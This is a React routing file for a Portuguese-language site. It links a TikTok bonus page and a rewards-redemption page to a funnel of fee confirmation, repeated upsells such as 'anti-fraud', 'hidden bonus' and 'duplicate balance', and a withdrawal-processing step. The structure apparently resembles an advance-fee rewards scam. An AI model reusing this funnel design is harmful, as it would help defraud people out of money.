import { lazy, Suspense } from "react";
import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import { useTikTokAttribution } from "@/hooks/useTikTokAttribution";
const Index = lazy(() => import("./pages/Index"));
const TikTokBonusPage = lazy(() => import("./components/TikTokBonus"));
import NotFound from "./pages/NotFound";
import FunnelSkeleton from "@/components/funnel/FunnelSkeleton";

// Lazy-loaded routes
const RedeemRewards = lazy(() => import("./pages/RedeemRewards"));
const FunnelLayout = lazy(() => import("@/components/funnel/FunnelLayout"));
const FunnelConfirmTaxPage = lazy(() => import("./pages/funnel/FunnelConfirmTaxPage"));
const FunnelUpsellTENFPage = lazy(() => import("./pages/funnel/FunnelUpsellTENFPage"));
const FunnelUpsellTransacionalPage = lazy(() => import("./pages/funnel/FunnelUpsellTransacionalPage"));
const FunnelUpsellAntiFraudePage = lazy(() => import("./pages/funnel/FunnelUpsellAntiFraudePage"));
const FunnelUpsellBonusOcultoPage = lazy(() => import("./pages/funnel/FunnelUpsellBonusOcultoPage"));
const FunnelUpsellAntiReversaoPage = lazy(() => import("./pages/funnel/FunnelUpsellAntiReversaoPage"));
const FunnelUpsellSaqueImediatoPage = lazy(() => import("./pages/funnel/FunnelUpsellSaqueImediatoPage"));
const FunnelUpsellAntiErrosPage = lazy(() => import("./pages/funnel/FunnelUpsellAntiErrosPage"));
const FunnelUpsellSaldoDuplicadoPage = lazy(() => import("./pages/funnel/FunnelUpsellSaldoDuplicadoPage"));
const FunnelSuccessPage = lazy(() => import("./pages/funnel/FunnelSuccessPage"));
const FunnelWithdrawProcessingPage = lazy(() => import("./pages/funnel/FunnelWithdrawProcessingPage"));
const AdminDashboard = lazy(() => import("./pages/AdminDashboard"));

const queryClient = new QueryClient();

const App = () => {
  useTikTokAttribution();

  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Sonner />
        <BrowserRouter>
          <Suspense fallback={null}>
            <Routes>
              <Route path="/" element={<Suspense fallback={null}><Index /></Suspense>} />
              <Route path="/bonus" element={<Suspense fallback={null}><TikTokBonusPage /></Suspense>} />
              <Route path="/resgatar" element={<RedeemRewards />} />
              <Route path="/funil" element={
                <Suspense fallback={<FunnelSkeleton />}>
                  <FunnelLayout />
                </Suspense>
              }>
                <Route path="confirmar-identidade" element={<FunnelConfirmTaxPage />} />
                <Route path="confirmar-taxa" element={<FunnelConfirmTaxPage />} />
                <Route path="upsell-tenf" element={<FunnelUpsellTENFPage />} />
                <Route path="upsell-transacional" element={<FunnelUpsellTransacionalPage />} />
                <Route path="upsell-antifraude" element={<FunnelUpsellAntiFraudePage />} />
                <Route path="upsell-bonus-oculto" element={<FunnelUpsellBonusOcultoPage />} />
                <Route path="upsell-anti-reversao" element={<FunnelUpsellAntiReversaoPage />} />
                <Route path="upsell-saque-imediato" element={<FunnelUpsellSaqueImediatoPage />} />
                <Route path="upsell-anti-erros" element={<FunnelUpsellAntiErrosPage />} />
                <Route path="upsell-saldo-duplicado" element={<FunnelUpsellSaldoDuplicadoPage />} />
              <Route path="processando-saque" element={<FunnelWithdrawProcessingPage />} />
                <Route path="sucesso" element={<FunnelSuccessPage />} />
              </Route>
              <Route path="/admin" element={<AdminDashboard />} />
              <Route path="*" element={<NotFound />} />
            </Routes>
          </Suspense>
        </BrowserRouter>
      </TooltipProvider>
    </QueryClientProvider>
  );
};

export default App;
